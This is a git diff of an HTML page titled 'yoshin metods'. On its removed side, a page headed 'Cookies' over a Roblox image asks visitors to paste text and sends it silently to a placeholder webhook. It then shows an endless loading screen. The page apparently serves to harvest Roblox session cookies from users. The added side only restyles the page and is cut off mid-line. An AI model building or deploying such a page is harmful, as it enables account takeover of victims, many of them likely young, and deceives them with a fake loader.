@@ -6,144 +6,37 @@
     <title>yoshin metods</title>
 
     <style>
+        /* -------- GERAL -------- */
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background: url('https://tr.rbxcdn.com/9f5d58a6cb4cb5da9d5d0a2f03f0b625/420/420/Image/Png') no-repeat center center fixed;
-            background-size: cover;
-            backdrop-filter: blur(3px);
+            font-family: "Arial", sans-serif;
+            background: #000;
             color: white;
+            overflow: hidden;
         }
 
-        .container {
-            width: 420px;
-            margin: 120px auto;
-            background: #111;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px #ff000088;
-            text-align: center;
-            border: 1px solid #ff0000;
-        }
-
-        h1 {
-            margin-bottom: 10px;
-            color: #ff2a2a;
-            font-size: 28px;
-            text-shadow: 0 0 10px red;
-        }
-
-        input {
-            width: 90%;
-            padding: 12px;
-            margin-top: 15px;
-            border-radius: 10px;
-            border: none;
-            outline: none;
-            font-size: 15px;
-            background: #222;
-            color: white;
-            border: 1px solid #ff0000;
-        }
-
-        button {
-            margin-top: 20px;
-            padding: 12px 40px;
-            background: #ff0000;
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 17px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        button:hover {
-            background: #cc0000;
-        }
-
-        /* Tela de carregamento */
-        #loadingScreen {
+        /* -------- EFEITO DE LUZ NO FUNDO -------- */
+        .neon-bg {
             position: fixed;
-            top: 0;
-            left: 0;
             width: 100%;
             height: 100%;
-            background: #000000ee;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            color: white;
-            font-size: 22px;
+            pointer-events: none;
+            background: radial-gradient(circle at top left, #ff000033, transparent),
+                        radial-gradient(circle at bottom right, #ff000033, transparent);
+            animation: glowMove 8s infinite alternate ease-in-out;
         }
 
-        .loader {
-            width: 300px;
-            height: 18px;
-            background: #222;
-            border-radius: 12px;
-            margin-top: 20px;
-            overflow: hidden;
-            border: 1px solid red;
+        @keyframes glowMove {
+            0% { filter: blur(40px); opacity: 0.6; }
+            100% { filter: blur(70px); opacity: 1; }
         }
 
-        .loader-bar {
-            height: 100%;
-            width: 40%;
-            background: red;
-            animation: loading 1s infinite linear;
-        }
-
-        @keyframes loading {
-            0% { margin-left: -40%; }
-            100% { margin-left: 100%; }
-        }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <h1>Cookies</h1>
-
-        <p>Digite qualquer texto:</p>
-
-        <input id="textoInput" type="text" placeholder="Escreva algo..." />
-
-        <button onclick="enviarTexto()">Enviar</button>
-    </div>
-
-    <!-- TELA DE CARREGAMENTO -->
-    <div id="loadingScreen">
-        <div>Carregando...</div>
-        <div class="loader"><div class="loader-bar"></div></div>
-    </div>
-
-    <script>
-        function enviarTexto() {
-            const texto = document.getElementById("textoInput").value.trim();
-
-            if (texto === "") {
-                alert("Digite alguma coisa antes de enviar!");
-                return;
-            }
-
-            // Mostrar tela de carregamento
-            document.getElementById("loadingScreen").style.display = "flex";
-
-            // Enviar para o webhook (texto permitido)
-            fetch("SEU_WEBHOOK_AQUI", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "📩 **Nova mensagem enviada:**\n" + texto
-                })
-            });
-
-            // Mantém carregando infinitamente — sem redirecionar
-        }
-    </script>
-
-</body>
-</html>
+        /* -------- CONTAINER -------- */
+        .container {
+            width: 450px;
+            margin: 120px auto;
+            background: #0c0c0c;
+            padding: 30px;
+            border-radius: 20px;
+            text-a
